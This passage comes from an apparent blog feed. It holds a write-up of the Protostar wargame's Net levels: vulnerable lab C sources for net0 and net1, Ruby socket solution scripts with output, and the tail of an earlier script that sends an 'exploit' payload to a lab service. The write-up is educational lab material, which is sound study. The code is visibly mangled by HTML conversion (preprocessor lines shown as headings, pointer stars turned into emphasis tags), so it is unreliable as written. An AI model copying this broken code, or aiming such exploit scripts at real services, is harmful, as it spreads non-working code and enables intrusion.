</span><span class='line'><span class="sr">&lt;p&gt;puts &amp;ldquo;Using host: </span><span class="si">#{</span><span class="n">host</span><span class="si">}</span><span class="sr">&amp;rdquo;&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span> <span class="n">host</span><span class="p">,</span> <span class="mi">2993</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span>
</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Net Levels)]]></title>
    <link href="http://73696e65.github.io/blog/2015/07/05/exploit-exercises-protostar-net-levels/"/>
    <updated>2015-07-05T06:21:02+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/07/05/exploit-exercises-protostar-net-levels</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ wget &lt;a href="https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt">https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt&lt;/a> &ndash;no-check-certificate -O ~/.gdbinit -q</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Net0</h2>

<p><figure class='code'><figcaption><span>net0.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;..</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">common</span><span class="p">.</span><span class="n">c</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">NAME</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">net0</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">UID</span> <span class="mi">999</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">GID</span> <span class="mi">999</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">PORT</span> <span class="mi">2999</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">run</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">wanted</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">wanted</span> <span class="o">=</span> <span class="n">random</span><span class="p">();</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Please</span> <span class="n">send</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">%</span><span class="n">d</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="n">as</span> <span class="n">a</span> <span class="n">little</span> <span class="n">endian</span> <span class="mi">32</span><span class="n">bit</span> <span class="kt">int</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">wanted</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">i</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">:</span><span class="p">(</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="n">wanted</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Thank</span> <span class="n">you</span> <span class="n">sir</span><span class="o">/</span><span class="n">madam</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">I</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">m</span> <span class="n">sorry</span><span class="p">,</span> <span class="n">you</span> <span class="n">sent</span> <span class="o">%</span><span class="n">d</span> <span class="n">instead</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">i</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Run</span> <span class="n">the</span> <span class="n">process</span> <span class="n">as</span> <span class="n">a</span> <span class="n">daemon</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Wait</span> <span class="k">for</span> <span class="n">socket</span> <span class="n">activity</span> <span class="n">and</span> <span class="k">return</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Set</span> <span class="n">the</span> <span class="n">client</span> <span class="n">socket</span> <span class="n">to</span> <span class="n">STDIN</span><span class="p">,</span> <span class="n">STDOUT</span><span class="p">,</span> <span class="n">and</span> <span class="n">STDERR</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Don</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">t</span> <span class="k">do</span> <span class="nl">this</span> <span class="p">:</span><span class="o">&gt;</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">run</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Converting strings to little endian integers. Solution:</p>

<p><figure class='code'><figcaption><span>net0.rb </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;!/us</span><span class="n">r</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">env</span> <span class="n">ruby</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;require &amp;lsquo;socket&amp;rsquo;&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">host</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mi">127</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">2999</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;s = TCPSocket.new host, port</span>
</span><span class='line'><span class="sr">while line = s.gets</span>
</span><span class='line'><span class="sr">        puts line</span>
</span><span class='line'><span class="sr">        n = [Integer(line.scan(/</span><span class="p">\</span><span class="n">d</span><span class="o">+/</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">)</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">V</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
</span><span class='line'>        <span class="n">s</span><span class="o">.</span><span class="n">send</span> <span class="n">n</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'>        <span class="n">s</span><span class="o">.</span><span class="n">flush</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ./net0.rb
</span><span class='line'>Please send &lsquo;1690508608&rsquo; as a little endian 32bit int
</span><span class='line'>Thank you sir/madam</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Net1</h2>

<p><figure class='code'><figcaption><span>net1.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;..</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">common</span><span class="p">.</span><span class="n">c</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">NAME</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">net1</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">UID</span> <span class="mi">998</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">GID</span> <span class="mi">998</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">PORT</span> <span class="mi">2998</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">run</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">fub</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">wanted</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">wanted</span> <span class="o">=</span> <span class="n">random</span><span class="p">();</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">sprintf</span><span class="p">(</span><span class="n">fub</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">%</span><span class="n">d</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">wanted</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">wanted</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">wanted</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">wanted</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">:</span><span class="p">(</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">:</span><span class="p">(</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="err">\</span><span class="n">r</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;);</span> <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;);</span> <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">fub</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">you</span> <span class="n">correctly</span> <span class="n">sent</span> <span class="n">the</span> <span class="n">data</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">you</span> <span class="n">didn</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">t</span> <span class="n">send</span> <span class="n">the</span> <span class="n">data</span> <span class="n">properly</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Run</span> <span class="n">the</span> <span class="n">process</span> <span class="n">as</span> <span class="n">a</span> <span class="n">daemon</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Wait</span> <span class="k">for</span> <span class="n">socket</span> <span class="n">activity</span> <span class="n">and</span> <span class="k">return</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Set</span> <span class="n">the</span> <span class="n">client</span> <span class="n">socket</span> <span class="n">to</span> <span class="n">STDIN</span><span class="p">,</span> <span class="n">STDOUT</span><span class="p">,</span> <span class="n">and</span> <span class="n">STDERR</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Don</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">t</span> <span class="k">do</span> <span class="nl">this</span> <span class="p">:</span><span class="o">&gt;</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">run</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Another easy challenge, we need to convert binary integers to string. Solution:</p>

<p><figure class='code'><figcaption><span>net1.rb </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;!/us</span><span class="n">r</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">env</span> <span class="n">ruby</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;require &amp;lsquo;socket&amp;rsquo;&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
